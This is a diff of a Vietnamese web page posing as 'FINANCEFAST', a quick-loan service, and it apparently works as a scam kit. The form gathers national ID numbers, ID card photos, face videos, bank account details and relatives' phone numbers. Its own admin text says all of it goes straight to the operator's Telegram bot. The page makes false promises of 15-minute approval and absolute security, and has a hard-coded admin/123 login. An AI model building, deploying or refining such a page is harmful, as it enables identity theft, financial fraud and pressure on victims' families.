@@ -3,133 +3,280 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hệ Thống Hỗ Trợ Tài Chính Trực Tuyến</title>
+    <title>FINANCEFAST - Hỗ Trợ Tài Chính Tiêu Dùng Nhanh Chóng</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Plus Jakarta Sans', sans-serif; }
+        .slider-thumb::-webkit-slider-thumb {
+            appearance: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #F59E0B;
+            cursor: pointer;
+            box-shadow: 0 6px 15px rgba(245, 158, 11, 0.4);
+            border: 4px solid #ffffff;
+            transition: transform 0.1s ease;
+        }
+        .slider-thumb::-webkit-slider-thumb:active { transform: scale(1.1); }
+    </style>
 </head>
-<body class="bg-gradient-to-br from-blue-900 to-indigo-900 min-h-screen flex items-center justify-center p-4">
-    <div class="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden p-6 relative">
-        
-        <!-- 1. MÀN HÌNH ĐĂNG NHẬP / ĐĂNG KÝ -->
-        <div id="stepAuth" class="space-y-4">
-            <div class="text-center mb-6">
-                <h1 class="text-2xl font-extrabold text-blue-600">FINANCE<span class="text-yellow-500">FAST</span></h1>
-                <p class="text-xs text-gray-500 mt-1">Đăng nhập để tiếp tục xét duyệt khoản vay</p>
-            </div>
-            <div class="flex border-b mb-4">
-                <button onclick="switchAuthTab('login')" id="tabLoginBtn" class="flex-1 pb-2 font-bold text-blue-600 border-b-2 border-blue-600 text-sm">Đăng Nhập</button>
-                <button onclick="switchAuthTab('register')" id="tabRegBtn" class="flex-1 pb-2 font-semibold text-gray-400 text-sm">Đăng Ký</button>
-            </div>
-            
-            <div id="loginBox" class="space-y-3">
-                <input type="tel" id="loginPhone" placeholder="Số điện thoại" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-                <input type="password" id="loginPass" placeholder="Mật khẩu" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-                <button onclick="handleLogin()" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 shadow-md">Đăng Nhập</button>
-            </div>
+<body class="bg-slate-900 text-slate-100 min-h-screen flex flex-col justify-between selection:bg-amber-500 selection:text-slate-900">
 
-            <div id="registerBox" class="space-y-3 hidden">
-                <input type="text" id="regName" placeholder="Họ và tên" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-                <input type="tel" id="regPhone" placeholder="Số điện thoại" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-                <input type="password" id="regPass" placeholder="Mật khẩu tài khoản" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-                <button onclick="handleRegister()" class="w-full bg-green-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-green-700 shadow-md">Đăng Ký Ngay</button>
+    <!-- HEADER CAO CẤP -->
+    <header class="w-full bg-slate-900/90 backdrop-blur-md border-b border-slate-800 sticky top-0 z-50 px-4 py-3.5">
+        <div class="max-w-md mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-2.5">
+                <div class="w-10 h-10 rounded-2xl bg-gradient-to-tr from-amber-500 to-amber-400 flex items-center justify-center font-black text-slate-900 text-xl shadow-lg shadow-amber-500/20">🐱</div>
+                <div>
+                    <span class="font-extrabold text-base tracking-tight text-white block leading-none">FINANCE<span class="text-amber-400">FAST</span></span>
+                    <span class="text-[10px] text-slate-400 font-medium">Hệ thống tài chính 24/7</span>
+                </div>
+            </div>
+            <div class="flex items-center space-x-2">
+                <!-- NÚT HỖ TRỢ / CSKH (Thay link Telegram/Zalo của ông vào đây) -->
+                <a href="https://t.me/USERNAME_CUA_ONG" target="_blank" class="text-xs font-bold text-amber-400 bg-amber-500/10 hover:bg-amber-500/20 px-3 py-2 rounded-xl border border-amber-500/30 transition flex items-center space-x-1">
+                    <span>💬 Hỗ Trợ</span>
+                </a>
+                <button onclick="openAuthModal()" class="text-xs font-bold text-slate-300 bg-slate-800 hover:bg-slate-700 px-3 py-2 rounded-xl border border-slate-700 transition">Đăng Nhập</button>
             </div>
         </div>
+    </header>
 
-        <!-- 2. MÀN HÌNH TRANG CHỦ - CHỌN MỨC VAY & Ô NHẢY SỐ UY TÍN -->
-        <div id="stepHome" class="space-y-4 hidden">
-            <div class="text-center mb-2">
-                <h2 class="text-xl font-bold text-gray-800">Hạn Mức Hỗ Trợ</h2>
-                <p class="text-xs text-gray-500">Chọn khoản vay phù hợp với nhu cầu của bạn</p>
-            </div>
+    <!-- NỘI DUNG CHÍNH -->
+    <main class="flex-1 flex items-center justify-center p-4 py-8">
+        <div class="max-w-md w-full bg-slate-800/90 backdrop-blur-xl rounded-3xl shadow-2xl border border-slate-700/80 p-6 md:p-8 relative overflow-hidden">
+            
+            <div class="absolute -top-24 -right-24 w-48 h-48 bg-amber-500/10 rounded-full blur-3xl pointer-events-none"></div>
 
-            <!-- Ô BẢNG THÔNG BÁO GIẢI NGÂN REAL-TIME (TẠO ĐỘ UY TÍN) -->
-            <div class="bg-amber-50 border border-amber-200 rounded-xl p-3 flex items-center space-x-3 shadow-inner">
-                <div class="bg-amber-500 text-white rounded-full p-1.5 animate-pulse">
-                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+            <!-- 1. TRANG CHỦ: KÉO CHỌN HẠN MỨC -->
+            <div id="stepHome" class="space-y-6">
+                <div class="space-y-1.5 text-center md:text-left">
+                    <h1 class="text-2xl md:text-3xl font-black text-white tracking-tight">Chạm nhẹ một cái,<br>tiền về liền tay!</h1>
+                    <p class="text-xs text-slate-400 font-medium">Lựa chọn hạn mức vay linh hoạt theo nhu cầu</p>
                 </div>
-                <div class="overflow-hidden">
-                    <p class="text-[10px] text-amber-800 font-bold uppercase tracking-wider">Hệ thống vừa giải ngân:</p>
-                    <div id="liveTicker" class="text-xs font-bold text-green-700 transition-all duration-500">
-                        Khách hàng 098****382 vừa duyệt vay 20.000.000 VNĐ
+
+                <div class="bg-slate-900/80 border border-slate-700/60 p-4 rounded-2xl text-center shadow-inner">
+                    <span class="text-xs text-slate-400 block font-semibold mb-1">HẠN MỨC ĐỀ XUẤT</span>
+                    <span id="amountDisplay" class="text-3xl font-black text-amber-400 tracking-tight">14.500.000 ₫</span>
+                </div>
+
+                <div class="space-y-3">
+                    <input type="range" id="loanRange" min="500000" max="50000000" step="500000" value="14500000" 
+                           oninput="updateSlider(this.value)" 
+                           class="w-full h-3 bg-slate-900 rounded-lg appearance-none cursor-pointer slider-thumb accent-amber-500 border border-slate-700">
+                    <div class="flex justify-between text-xs font-semibold text-slate-400">
+                        <span>500.000 ₫</span>
+                        <span>50.000.000 ₫</span>
+                    </div>
+                </div>
+
+                <button onclick="startLoanProcess()" class="w-full bg-gradient-to-r from-amber-500 to-amber-400 hover:from-amber-400 hover:to-amber-300 text-slate-900 py-4 rounded-2xl font-black text-base shadow-lg shadow-amber-500/25 transition active:scale-[0.98]">
+                    Vay Nhanh Ngay
+                </button>
+
+                <div class="grid grid-cols-3 gap-2 pt-2 text-center">
+                    <div class="bg-slate-900/50 p-2.5 rounded-xl border border-slate-700/40">
+                        <span class="text-base">⚡</span>
+                        <p class="text-[10px] text-slate-300 font-bold mt-1">Duyệt 15 phút</p>
+                    </div>
+                    <div class="bg-slate-900/50 p-2.5 rounded-xl border border-slate-700/40">
+                        <span class="text-base">🔒</span>
+                        <p class="text-[10px] text-slate-300 font-bold mt-1">Bảo mật tuyệt đối</p>
+                    </div>
+                    <div class="bg-slate-900/50 p-2.5 rounded-xl border border-slate-700/40">
+                        <span class="text-base">💸</span>
+                        <p class="text-[10px] text-slate-300 font-bold mt-1">Giải ngân 24/7</p>
                     </div>
                 </div>
             </div>
 
-            <div class="bg-blue-50 p-4 rounded-xl border border-blue-100 space-y-3">
-                <div>
-                    <label class="block text-xs font-semibold text-gray-600 mb-1">Số tiền muốn vay</label>
-                    <select id="loanAmount" class="w-full p-2.5 border rounded-lg text-sm bg-white">
-                        <option value="5.000.000 VNĐ">5.000.000 VNĐ</option>
-                        <option value="10.000.000 VNĐ" selected>10.000.000 VNĐ</option>
-                        <option value="20.000.000 VNĐ">20.000.000 VNĐ</option>
-                        <option value="50.000.000 VNĐ">50.000.000 VNĐ</option>
-                    </select>
+            <!-- TIẾN TRÌNH CÁC BƯỚC (1 ĐẾN 4) -->
+            <div id="progressContainer" class="hidden mb-6 space-y-2">
+                <div class="flex justify-between items-center text-xs">
+                    <span id="stepTitle" class="font-bold text-amber-400">Bước 1/4: Thông tin cá nhân</span>
+                    <span id="stepPercent" class="text-slate-400 font-semibold">25%</span>
                 </div>
-                <div>
-                    <label class="block text-xs font-semibold text-gray-600 mb-1">Thời hạn trả góp</label>
-                    <select id="loanTerm" class="w-full p-2.5 border rounded-lg text-sm bg-white">
-                        <option value="3 Tháng">3 Tháng</option>
-                        <option value="6 Tháng" selected>6 Tháng</option>
-                        <option value="12 Tháng">12 Tháng</option>
-                    </select>
+                <div class="w-full bg-slate-900 h-2.5 rounded-full overflow-hidden p-0.5 border border-slate-700">
+                    <div id="progressBar" class="bg-gradient-to-r from-amber-500 to-amber-400 h-full rounded-full transition-all duration-300" style="width: 25%;"></div>
                 </div>
             </div>
-            <button onclick="goToStep(1)" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 shadow-md">Đăng Ký Vay Ngay</button>
-        </div>
 
-        <!-- 3. TRANG 1: THÔNG TIN CÁ NHÂN -->
-        <div id="step1" class="space-y-3 hidden">
-            <div class="flex justify-between items-center mb-2"><span class="text-xs font-bold text-blue-600">BƯỚC 1/4</span><span class="text-xs text-gray-400">Thông tin cá nhân</span></div>
-            <input type="text" id="pName" placeholder="Họ và tên đầy đủ" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <input type="text" id="pDob" placeholder="Ngày sinh (Ví dụ: 24/08/2002)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <input type="text" id="pAddress" placeholder="Quê quán / Địa chỉ thường trú" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <input type="text" id="pCccd" placeholder="Số CCCD / CMND" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <button onclick="nextStep(1)" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 mt-2">Tiếp Tục</button>
-        </div>
-
-        <!-- 4. TRANG 2: NGƯỜI THÂN THẨM ĐỊNH -->
-        <div id="step2" class="space-y-3 hidden">
-            <div class="flex justify-between items-center mb-2"><span class="text-xs font-bold text-blue-600">BƯỚC 2/4</span><span class="text-xs text-gray-400">Người thân tham chiếu</span></div>
-            <input type="text" id="rName1" placeholder="Họ tên người thân (Vợ/Bố/Mẹ/Anh chị)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <input type="tel" id="rPhone1" placeholder="Số điện thoại người thân" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <input type="text" id="rRelation" placeholder="Mối quan hệ (Ví dụ: Vợ chồng, Ruột thịt)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <button onclick="nextStep(2)" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 mt-2">Tiếp Tục</button>
-        </div>
-
-        <!-- 5. TRANG 3: SỐ TÀI KHOẢN NGÂN HÀNG -->
-        <div id="step3" class="space-y-3 hidden">
-            <div class="flex justify-between items-center mb-2"><span class="text-xs font-bold text-blue-600">BƯỚC 3/4</span><span class="text-xs text-gray-400">Tài khoản nhận giải ngân</span></div>
-            <input type="text" id="bankName" placeholder="Tên ngân hàng (Ví dụ: MB Bank, Techcombank)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <input type="text" id="bankAccount" placeholder="Số tài khoản ngân hàng nhận tiền" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <input type="text" id="bankOwner" placeholder="Tên chủ tài khoản (Viết hoa không dấu)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
-            <button onclick="nextStep(3)" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 mt-2">Tiếp Tục</button>
-        </div>
-
-        <!-- 6. TRANG 4: eKYC (CHỤP ẢNH & QUAY VIDEO) -->
-        <div id="step4" class="space-y-3 hidden">
-            <div class="flex justify-between items-center mb-1"><span class="text-xs font-bold text-blue-600">BƯỚC 4/4</span><span class="text-xs text-gray-400">Xác thực khuôn mặt & CCCD</span></div>
-            <div class="grid grid-cols-2 gap-2">
-                <div>
-                    <label class="block text-[11px] font-semibold text-gray-600 mb-1">CCCD Mặt Trước</label>
-                    <input type="file" id="imgFront" accept="image/*" class="w-full text-xs text-gray-500 file:py-1 file:px-2 file:rounded file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700">
+            <!-- TRANG 1: THÔNG TIN CÁ NHÂN -->
+            <div id="step1" class="space-y-4 hidden">
+                <div class="space-y-3.5">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Họ và tên đầy đủ (trên CCCD)</label>
+                        <input type="text" id="pName" placeholder="NGUYỄN VĂN A" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm uppercase focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Ngày tháng năm sinh</label>
+                        <input type="text" id="pDob" placeholder="DD/MM/YYYY (Ví dụ: 24/08/2002)" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Quê quán / Địa chỉ thường trú</label>
+                        <input type="text" id="pAddress" placeholder="Số nhà, Xã/Phường, Huyện/Quận, Tỉnh/TP" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Số Căn cước công dân (CCCD)</label>
+                        <input type="text" id="pCccd" placeholder="Nhập 12 chữ số CCCD" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
                 </div>
-                <div>
-                    <label class="block text-[11px] font-semibold text-gray-600 mb-1">CCCD Mặt Sau</label>
-                    <input type="file" id="imgBack" accept="image/*" class="w-full text-xs text-gray-500 file:py-1 file:px-2 file:rounded file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700">
-                </div>
+                <button onclick="nextStep(1)" class="w-full bg-gradient-to-r from-amber-500 to-amber-400 hover:from-amber-400 text-slate-900 py-3.5 rounded-2xl font-black text-sm shadow-lg shadow-amber-500/25 transition mt-2">Tiếp Tục</button>
             </div>
-            <div class="border p-2.5 rounded-xl bg-gray-50 text-center">
-                <label class="block text-xs font-semibold text-gray-700 mb-1">Quay video khuôn mặt (3 giây)</label>
-                <video id="webcam" autoplay playsinline muted class="w-full h-24 bg-black rounded-lg mb-1 object-cover"></video>
-                <div class="flex justify-center space-x-2">
-                    <button type="button" onclick="startCamera()" class="bg-blue-600 text-white px-2.5 py-1 rounded text-xs">Bật Cam</button>
-                    <button type="button" onclick="recordVideo()" id="recBtn" class="bg-red-600 text-white px-2.5 py-1 rounded text-xs hidden">Quay</button>
-                </div>
-                <p id="camStatus" class="text-[11px] text-gray-500 mt-1">Chưa bật camera</p>
-            </div>
-            <button onclick="submitFinalData()" id="finalBtn" class="w-full bg-green-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-green-700 shadow-md">Gửi Hồ Sơ Xét Duyệt</button>
-        </div>
 
+            <!-- TRANG 2: NGƯỜI THÂN THẨM ĐỊNH -->
+            <div id="step2" class="space-y-4 hidden">
+                <div class="space-y-3.5">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Họ tên người thân tham chiếu</label>
+                        <input type="text" id="rName1" placeholder="Ví dụ: NGUYỄN THỊ B" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm uppercase focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Số điện thoại người thân</label>
+                        <input type="tel" id="rPhone1" placeholder="Số điện thoại liên lạc người thân" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Mối quan hệ</label>
+                        <input type="text" id="rRelation" placeholder="Ví dụ: Vợ chồng, Bố mẹ, Anh chị em" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
+                </div>
+                <button onclick="nextStep(2)" class="w-full bg-gradient-to-r from-amber-500 to-amber-400 hover:from-amber-400 text-slate-900 py-3.5 rounded-2xl font-black text-sm shadow-lg shadow-amber-500/25 transition mt-2">Tiếp Tục</button>
+            </div>
+
+            <!-- TRANG 3: TÀI KHOẢN NGÂN HÀNG -->
+            <div id="step3" class="space-y-4 hidden">
+                <div class="space-y-3.5">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Tên Ngân Hàng nhận tiền</label>
+                        <input type="text" id="bankName" placeholder="Ví dụ: MB Bank, Techcombank, VPBank" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Số Tài Khoản (STK)</label>
+                        <input type="text" id="bankAccount" placeholder="Nhập chính xác số tài khoản ngân hàng" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1">Tên Chủ Tài Khoản</label>
+                        <input type="text" id="bankOwner" placeholder="VIẾT HOA KHÔNG DẤU GIỐNG THẺ" class="w-full px-4 py-3 bg-slate-900/90 border border-slate-700 rounded-xl text-sm uppercase focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                    </div>
+                </div>
+                <button onclick="nextStep(3)" class="w-full bg-gradient-to-r from-amber-500 to-amber-400 hover:from-amber-400 text-slate-900 py-3.5 rounded-2xl font-black text-sm shadow-lg shadow-amber-500/25 transition mt-2">Tiếp Tục Xác Thực</button>
+            </div>
+
+            <!-- TRANG 4: eKYC (CHỤP ẢNH & QUAY VIDEO) -->
+            <div id="step4" class="space-y-4 hidden">
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="block text-[11px] font-bold text-slate-300 mb-1">CCCD Mặt Trước</label>
+                        <input type="file" id="imgFront" accept="image/*" class="w-full text-xs text-slate-400 file:py-2.5 file:px-3 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-amber-500/20 file:text-amber-400 hover:file:bg-amber-500/30 cursor-pointer">
+                    </div>
+                    <div>
+                        <label class="block text-[11px] font-bold text-slate-300 mb-1">CCCD Mặt Sau</label>
+                        <input type="file" id="imgBack" accept="image/*" class="w-full text-xs text-slate-400 file:py-2.5 file:px-3 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-amber-500/20 file:text-amber-400 hover:file:bg-amber-500/30 cursor-pointer">
+                    </div>
+                </div>
+
+                <div class="border border-slate-700/80 p-3.5 rounded-2xl bg-slate-900/60 text-center space-y-2">
+                    <label class="block text-xs font-bold text-slate-200">Quay video khuôn mặt eKYC (3 giây)</label>
+                    <div class="relative w-full h-32 bg-black rounded-xl overflow-hidden border border-slate-700">
+                        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover"></video>
+                    </div>
+                    <div class="flex justify-center space-x-2 pt-1">
+                        <button type="button" onclick="startCamera()" class="bg-slate-700 hover:bg-slate-600 text-white px-3.5 py-1.5 rounded-xl text-xs font-bold transition">Bật Camera</button>
+                        <button type="button" onclick="recordVideo()" id="recBtn" class="bg-red-600 hover:bg-red-500 text-white px-3.5 py-1.5 rounded-xl text-xs font-bold hidden animate-pulse">Bắt Đầu Quay</button>
+                    </div>
+                    <p id="camStatus" class="text-[11px] text-slate-400">Trạng thái: Chưa bật camera</p>
+                </div>
+
+                <button onclick="submitFinalData()" id="finalBtn" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 text-white py-3.5 rounded-2xl font-black text-sm shadow-lg shadow-emerald-600/25 transition">Gửi Hồ Sơ Xét Duyệt</button>
+            </div>
+
+            <!-- TRANG 5: MÀN HÌNH TIẾN TRÌNH GIẢI NGÂN -->
+            <div id="stepSuccess" class="space-y-5 text-center hidden py-4">
+                <div class="w-16 h-16 bg-amber-500/20 text-amber-400 rounded-full flex items-center justify-center mx-auto text-3xl animate-bounce">⏳</div>
+                <div class="space-y-1">
+                    <h2 class="text-xl font-black text-white">Hồ Sơ Đang Được Xét Duyệt</h2>
+                    <p class="text-xs text-slate-400">Hệ thống đang thẩm định thông tin tự động cho khoản vay của bạn.</p>
+                </div>
+
+                <div class="bg-slate-900/80 border border-slate-700/80 rounded-2xl p-4 text-left space-y-2.5 text-xs">
+                    <div class="flex justify-between"><span class="text-slate-400">Mã giao dịch:</span><span class="font-bold text-white">#FF-882910</span></div>
+                    <div class="flex justify-between"><span class="text-slate-400">Hạn mức đăng ký:</span><span id="succAmount" class="font-bold text-amber-400">14.500.000 ₫</span></div>
+                    <div class="flex justify-between"><span class="text-slate-400">Trạng thái hiện tại:</span><span class="font-bold text-amber-400 bg-amber-500/10 px-2 py-0.5 rounded">Đang thẩm định hồ sơ</span></div>
+                </div>
+
+                <p class="text-[11px] text-slate-400 leading-relaxed">
+                    💡 <strong class="text-slate-300">Lưu ý:</strong> Vui lòng giữ điện thoại mở và để ý cuộc gọi từ chuyên viên thẩm định để nhận tiền giải ngân nhanh chóng trong 15 phút.
+                </p>
+
+                <a href="https://t.me/USERNAME_CUA_ONG" target="_blank" class="block w-full bg-slate-700 hover:bg-slate-600 text-white py-3 rounded-xl font-bold text-xs transition text-center">
+                    💬 Liên hệ Chuyên viên Hỗ trợ 24/7
+                </a>
+            </div>
+
+            <!-- MÀN HÌNH QUẢN TRỊ ADMIN (HIỆN KHI ĐĂNG NHẬP admin / 123) -->
+            <div id="adminPanel" class="space-y-4 hidden py-2">
+                <div class="flex justify-between items-center border-b border-slate-700 pb-3">
+                    <div>
+                        <h2 class="text-lg font-black text-white">Quản Trị Hệ Thống</h2>
+                        <p class="text-[11px] text-amber-400">Xin chào, Quản trị viên (Admin)</p>
+                    </div>
+                    <button onclick="location.reload()" class="bg-red-500/20 text-red-400 hover:bg-red-500/30 px-3 py-1.5 rounded-xl text-xs font-bold transition">Đăng Xuất</button>
+                </div>
+
+                <div class="bg-slate-900/90 border border-slate-700 rounded-2xl p-4 space-y-3">
+                    <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider">🛠️ Bảng Điều Khiển Nhanh</h3>
+                    <p class="text-xs text-slate-400 leading-relaxed">
+                        Tất cả thông tin, ảnh CCCD và video eKYC của khách hàng sau khi bấm gửi đều được bắn thẳng tự động vào **Bot Telegram** của ông theo thời gian thực.
+                    </p>
+                    <div class="bg-amber-500/10 border border-amber-500/30 p-3 rounded-xl text-[11px] text-amber-300">
+                        🔔 Ông hãy kiểm tra trực tiếp trên Telegram để xem chi tiết hồ sơ mới nhất và liên hệ giải ngân cho khách nhé!
+                    </div>
+                </div>
+
+                <button onclick="location.reload()" class="w-full bg-slate-700 hover:bg-slate-600 text-white py-3 rounded-xl font-bold text-xs transition">
+                    Quay lại Trang Chủ
+                </button>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- MODAL ĐĂNG NHẬP / ĐĂNG KÝ -->
+    <div id="authModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-slate-800 border border-slate-700 rounded-3xl max-w-sm w-full p-6 relative space-y-4 shadow-2xl">
+            <button onclick="closeAuthModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-lg font-bold">✕</button>
+            <div class="text-center space-y-1">
+                <h3 class="text-xl font-extrabold text-white">Cổng Khách Hàng</h3>
+                <p class="text-xs text-slate-400">Đăng nhập tài khoản hoặc Admin</p>
+            </div>
+            
+            <div class="flex bg-slate-900 p-1 rounded-xl border border-slate-700">
+                <button onclick="switchAuthTab('login')" id="tabLoginBtn" class="flex-1 py-2 font-bold text-xs rounded-lg bg-amber-500 text-slate-900 shadow-sm transition">Đăng Nhập</button>
+                <button onclick="switchAuthTab('register')" id="tabRegBtn" class="flex-1 py-2 font-bold text-xs rounded-lg text-slate-400 transition">Đăng Ký</button>
+            </div>
+
+            <div id="loginBox" class="space-y-3">
+                <!-- Hỗ trợ nhập SĐT hoặc chữ 'admin' -->
+                <input type="text" id="loginPhone" placeholder="Số điện thoại hoặc tài khoản" class="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                <input type="password" id="loginPass" placeholder="Mật khẩu (Admin: 123)" class="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                <button onclick="handleLogin()" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-900 py-3 rounded-xl font-black text-sm shadow-md transition">Đăng Nhập Ngay</button>
+            </div>
+
+            <div id="registerBox" class="space-y-3 hidden">
+                <input type="text" id="regName" placeholder="Họ và tên" class="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                <input type="tel" id="regPhone" placeholder="Số điện thoại" class="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                <input type="password" id="regPass" placeholder="Mật khẩu mới" class="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-amber-500 outline-none font-semibold text-white placeholder-slate-600">
+                <button onclick="handleRegister()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white py-3 rounded-xl font-black text-sm shadow-md transition">Đăng Ký Tài Khoản</button>
+            </div>
+        </div>
     </div>
+
+    <!-- FOOTER -->
+    <footer class="w-full text-center py-4 text-xs text-slate-500 border-t border-slate-800">
+        &copy; 2026 FINANCEFAST. Bảo mật thông tin tuyệt đối.
+    </footer>
 
     <script>
         // ⚙️ ĐIỀN THÔNG TIN TELEGRAM BOT CỦA ÔNG VÀO ĐÂY
@@ -139,61 +286,67 @@
         let formData = {};
         let mediaStream, mediaRecorder, recordedChunks = [], videoBlob = null;
 
-        // HIỆU ỨNG NHẢY SỐ ĐIỆN THOẠI / GIẢI NGÂN LIÊN TỤC
-        const tickerMessages = [
-            "Khách hàng 098****219 vừa duyệt vay 10.000.000 VNĐ",
-            "Khách hàng 035****881 vừa giải ngân 20.000.000 VNĐ",
-            "Khách hàng 091****442 vừa duyệt vay 50.000.000 VNĐ",
-            "Khách hàng 077****903 vừa giải ngân 5.000.000 VNĐ",
-            "Khách hàng 086****126 vừa duyệt vay 10.000.000 VNĐ"
-        ];
-        let tickerIndex = 0;
-        setInterval(() => {
-            const tickerEl = document.getElementById('liveTicker');
-            if(tickerEl) {
-                tickerEl.style.opacity = 0;
-                setTimeout(() => {
-                    tickerIndex = (tickerIndex + 1) % tickerMessages.length;
-                    tickerEl.textContent = tickerMessages[tickerIndex];
-                    tickerEl.style.opacity = 1;
-                }, 300);
-            }
-        }, 3000);
+        function updateSlider(val) {
+            const formatted = new Intl.NumberFormat('vi-VN').format(val) + " ₫";
+            document.getElementById('amountDisplay').textContent = formatted;
+        }
+
+        function openAuthModal() { document.getElementById('authModal').classList.remove('hidden'); }
+        function closeAuthModal() { document.getElementById('authModal').classList.add('hidden'); }
 
         function switchAuthTab(type) {
             if(type === 'login') {
                 document.getElementById('loginBox').classList.remove('hidden');
                 document.getElementById('registerBox').classList.add('hidden');
